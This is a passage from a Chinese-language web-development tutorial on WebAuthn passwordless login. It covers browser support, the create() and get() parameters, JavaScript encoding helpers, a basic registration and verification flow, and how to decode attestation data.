等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 